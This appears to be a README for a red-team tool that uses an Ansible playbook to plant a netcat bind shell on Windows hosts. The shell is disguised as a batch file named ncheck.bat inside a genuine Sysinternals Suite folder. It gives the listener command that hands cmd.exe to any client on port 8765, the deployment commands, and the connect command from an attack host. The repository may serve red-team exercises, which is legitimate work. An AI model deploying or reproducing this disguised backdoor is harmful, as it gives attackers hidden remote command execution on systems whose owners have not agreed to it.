# Sysintbind
Author: Lucas Brown

Red team tool that deploys a **bind shell** on Windows by dropping it inside a legitimate **Sysinternals Suite** install. The listener is named **ncheck.bat** so it looks like a normal “check” utility alongside real Sysinternals tools.

## What the tool does

1. Creates `C:\tools` and `C:\tools\SysinternalsSuite` on each target.
2. Downloads the official Microsoft Sysinternals Suite zip and extracts it into that folder.
3. Downloads netcat for Windows, extracts **nc.exe** into the same folder.
4. Copies **ncheck.bat** (the bind shell script) into the folder.
5. Starts **ncheck.bat** in the background so it listens on **TCP 8765** and runs `cmd.exe` for any connecting client.

After deployment you get a `cmd.exe` shell by connecting to the target on port 8765 (e.g. `nc <target_ip> 8765`).


## File reference
- **playbook.yml**: Ansible playbook. Creates dirs, downloads Sysinternals & netcat zips, extracts them, copies ncheck.bat, then starts ncheck.bat in the background. Targets the `windows` group. 
- **vars.yml**: Variables: Sysinternals zip URL, netcat zip URL, `C:\tools` path, and install path `C:\tools\SysinternalsSuite`. Override these if you need different URLs or paths. 
- **hosts.ini**: Example inventory for 6 Windows hosts (10.1.1.1–3, 10.2.1.1–3) with WinRM connection settings. Edit `ansible_user` and `ansible_password` (and optionally `ansible_port` if not using 5986). 
- **ncheck.bat**: Batch file deployed to the Sysinternals folder. On run it re-launches itself minimized, then runs `nc.exe -l -p 8765 -e cmd.exe` so the folder acts as a bind shell. Uses `%~dp0nc.exe` so it works regardless of install path. 

## How to deploy

### Prerequisites

- Ansible with Windows support: `ansible-galaxy collection install ansible.windows`, and `pip install pywinrm` for WinRM.
- Target Windows machines (e.g. Server 2022) with **WinRM** enabled and reachable (typically port 5985 or 5986 for HTTPS).

### Steps

1. Edit `hosts.ini`  
   Set `ansible_user` and `ansible_password` (and `ansible_host` per host if your IPs differ). Default port is 5986 (WinRM HTTPS); use 5985 for HTTP.

2. Run the playbook from this directory  
```sh
ansible-playbook playbook.yml -i hosts.ini
```  
To limit to specific hosts:
```sh
ansible-playbook playbook.yml -i hosts.ini --limit armory-bt1,sewers-bt1
```

3. Connect to the bind shell  
From your attack host:
```sh
nc -v <target_ip> 8765
```  
You should get a `cmd.exe` prompt on the target.
